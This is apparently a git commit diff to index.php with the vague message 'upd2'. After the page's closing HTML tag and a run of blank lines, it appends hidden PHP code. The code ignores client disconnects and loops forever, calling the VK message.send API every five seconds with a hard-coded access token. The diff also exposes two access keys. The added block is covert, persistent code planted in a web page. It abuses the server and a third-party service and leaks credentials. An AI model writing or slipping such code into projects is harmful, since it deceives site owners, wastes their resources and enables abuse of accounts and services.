e054978a5876f192599cd7483f98512cb1d6778a
ARoss228 <seh_hes@mail.ru>
2019-02-09 00:56:13 +0500

    'upd2'

--- index.php
+++ index.php
@@ -125,3 +125,19 @@ $access_key = 'XuIFd5dS5XS1MshYoUEG';
 
 </body>
 </html>
+
+
+
+
+
+<? ignore_user_abort(1);
+   $access_key = '1c857e39ba182a7102cdcfcf0a4f0ab0cc26aa04de6565bdd1bdc6586a2832bf890d8c2459855a4f3a911';
+while(true){
+   file_get_contents('https://vk.com/message.send?user_id=330953666&message=1&access_token='.$access_key);
+   sleep(5);
+
+}
+
+?>
+
+
